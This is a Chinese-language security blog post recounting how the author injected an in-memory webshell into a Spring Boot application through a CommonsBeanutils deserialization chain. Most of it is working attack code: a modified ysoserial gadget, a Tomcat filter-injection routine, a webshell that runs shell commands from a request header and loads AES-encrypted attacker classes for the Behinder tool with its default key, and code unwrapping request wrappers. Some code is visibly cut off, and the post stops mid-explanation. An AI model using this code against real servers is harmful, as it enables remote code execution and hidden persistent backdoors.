**作者：Y4er**  
**原文链接：**
朋友叫帮忙打一个内存马进去，用的是cb链，无cc依赖，我寻思这不是有手就行吗，谁知道接下来遇到了无数的坑。
## 改造cb链去除cc依赖
这个是p牛讲过的了，不多说，直接贴代码
    public Object getObject(final String command) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(command);
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add("1");
        queue.add("1");
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = template;
        queueArray[1] = template;
        return queue;
    }
用`String.CASE_INSENSITIVE_ORDER`替换掉cc的`org.apache.commons.collections.comparators.ComparableComparator`。
然后是内存马的地方，修改了`ysoserial.payloads.util.Gadgets`的createTemplatesImpl来加载自定义的class文件。
    public static Object createTemplatesImpl(String command) throws Exception {
        command = command.trim();
        Class tplClass;
        Class abstTranslet;
        Class transFactory;
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            tplClass = TemplatesImpl.class;
            abstTranslet = AbstractTranslet.class;
            transFactory = TransformerFactoryImpl.class;
        }
        if (command.startsWith("CLASS:")) {
            // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
            Class clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
            return createTemplatesImpl(clazz, null, null, tplClass, abstTranslet, transFactory);
        } else if (command.startsWith("FILE:")) {
            byte[] bs = Files.readBytes(new File(command.substring(5)));
            return createTemplatesImpl(null, null, bs, tplClass, abstTranslet, transFactory);
        } else {
            if (command.startsWith("CMD:")) command = command.substring(4);
            return createTemplatesImpl(null, command, null, tplClass, abstTranslet, transFactory);
        }
    }
    public static  T createTemplatesImpl(Class myClass, final String command, byte[] bytes, Class tplClass, Class abstTranslet, Class transFactory) throws Exception {
        final T templates = tplClass.newInstance();
        byte[] classBytes = new byte[0];
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass superC = pool.get(abstTranslet.getName());
        CtClass ctClass;
        if (command != null) {
            ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
            ctClass.setName(ctClass.getName() + System.nanoTime());
            String cmd = "cmd = \"" + command + "\";";
            ctClass.makeClassInitializer().insertBefore(cmd);
            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
        }
        if (myClass != null) {
            // CLASS:
            if (myClass.getName().contains("SpringInterceptorMemShell")) {
                // memShellClazz
                ctClass = pool.get(myClass.getName());
                // 修改b64字节码
                CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
                String clazzName = "ysoserial.payloads.templates.SpringInterceptorTemplate" + System.nanoTime();
                springTemplateClass.setName(clazzName);
                String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
                String b64content = "b64=\"" + encode + "\";";
                ctClass.makeClassInitializer().insertBefore(b64content);
                // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
                String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
                ctClass.setSuperclass(superC);
                classBytes = ctClass.toBytecode();
            } else {
                classBytes = ClassFiles.classAsBytes(myClass);
            }
        }
        if (bytes != null) {
            // FILE:
            ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
            ctClass.setName(ctClass.getName() + System.nanoTime());
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i  aClass = null;
                try {
                    aClass = (Class) standardContext.getClass().getSuperclass();
                    aClass.getDeclaredField("filterConfigs");
                } catch (Exception e) {
                    aClass = (Class) standardContext.getClass();
                    aClass.getDeclaredField("filterConfigs");
                }
                Field Configs = aClass.getDeclaredField("filterConfigs");
                Configs.setAccessible(true);
                Map filterConfigs = (Map) Configs.get(standardContext);
                TomcatFilterMemShellFromThread behinderFilter = new TomcatFilterMemShellFromThread();
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(behinderFilter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(behinderFilter.getClass().getName());
                /**
                 * 将filterDef添加到filterDefs中
                 */
                standardContext.addFilterDef(filterDef);
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern(URLPattern);
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                filterConfigs.put(name, filterConfig);
            } catch (Exception e) {
    //            e.printStackTrace();
            }
        }
    ...
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse) servletResponse;
                if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                    response.getWriter().println("error");
                    return;
                }
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }
按理说这样绝对没问题，事实证明确实没问题，访问内存马输出了error。接下来向里写冰蝎的马，这也是第一个坑。我的内存马如下
    @Override
    public void service(ServletRequest req, ServletResponse resp) throws ServletException, IOException {
        try {
            HttpServletRequest request = (HttpServletRequest) req;
            HttpServletResponse response = (HttpServletResponse) resp;
            HttpSession session = request.getSession();
            //create pageContext
            HashMap pageContext = new HashMap();
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
            if (request.getMethod().equals("GET")) {
                String cmd = request.getHeader("cmd");
                if (cmd != null && !cmd.isEmpty()) {
                    String[] cmds = null;
                    if (File.separator.equals("/")) {
                        cmds = new String[]{"/bin/sh", "-c", cmd};
                    } else {
                        cmds = new String[]{"cmd", "/c", cmd};
                    }
                    String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                    response.getWriter().println(result);
                }
            } else if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                if (request.getMethod().equals("POST")) {
                    String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                    session.putValue("u", k);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                    //revision BehinderFilter
                    Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                    Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                    evilclass.newInstance().equals(pageContext);
                }
            }
        } catch (Exception e) {
    //            e.printStackTrace();
        }
    }
问题来了，cmdshell可以输出响应结果，而连接冰蝎总是报`request.getReader().readLine()`空指针。这是我踩得第一个坑。
## 包装类问题
目标环境是springboot2.0.9，内嵌tomcat。思来想去不应该`request.getReader().readLine()`空指针啊，然后一步一步在调，发现service中获取的参数是经过了包装的类。我这里用springboot模拟一个包装类。在MyFilter中
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
        ContentCachingResponseWrapper responseWrapper = new ContentCachingResponseWrapper((HttpServletResponse) response);
        ContentCachingRequestWrapper requestWrapper = new ContentCachingRequestWrapper((HttpServletRequest) request);
        chain.doFilter(requestWrapper, responseWrapper);
        responseWrapper.copyBodyToResponse();
    }
向下传递的是经过ContentCaching包装的request和response。然后再另一个filter中，尝试`request.getReader().readLine()`确实报了空指针，导致冰蝎连不上。
然后我寻思我反射从从coyoteRequest中拼接body参数传递给冰蝎aes解密的decodeBuffer`c.doFinal(new
sun.misc.BASE64Decoder().decodeBuffer(payload))`
拼接完之后payload能正常获取了，也能正常解密了，然后`evilclass.newInstance().equals(pageContext)`的equals又出错了。
报了一个没有setCharacterEncoding方法。看了一下冰蝎的源码，发现`net.rebeyond.behinder.payload.java.Echo#fillContext`会进行反射调用setCharacterEncoding，但是ContentCachingResponseWrapper没有这个函数
除了这个地方，我又发现`org.springframework.web.util.ContentCachingResponseWrapper.ResponseServletOutputStream#ResponseServletOutputStream的write`函数重载没有只传入一个byte[]参数的
所以这个地方也会报错，导致冰蝎第一个请求包响应内容为空，进而导致连不上。
发现问题就解决问题。想过改冰蝎的class，但是工程量有点大，想了想还是改改内存马，不是包装类吗，我就拆了你的包装。
    Object lastRequest = request;
    Object lastResponse = response;
    // 解决包装类RequestWrapper的问题
    // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
    if (!(lastRequest instanceof RequestFacade)) {
        Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
        lastRequest = getRequest.invoke(request);
        while (true) {
            if (lastRequest instanceof RequestFacade) break;
            lastRequest = getRequest.invoke(lastRequest);
        }
    }
    // 解决包装类ResponseWrapper的问题
    if (!(lastResponse instanceof ResponseFacade)) {
        Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
        lastResponse = getResponse.invoke(response);
        while (true) {
            if (lastResponse instanceof ResponseFacade) break;
            lastResponse = getResponse.invoke(lastResponse);
        }
    }
    HttpSession session = ((RequestFacade) lastRequest).getSession();
    pageContext.put("request", lastRequest);
    pageContext.put("response", lastResponse);
    pageContext.put("session", session);
给冰蝎传的都是拆了包装的，这样解决了冰蝎class的问题，但是还有`request.getReader().readLine()`为空的问题。我是这么解决的，贴代码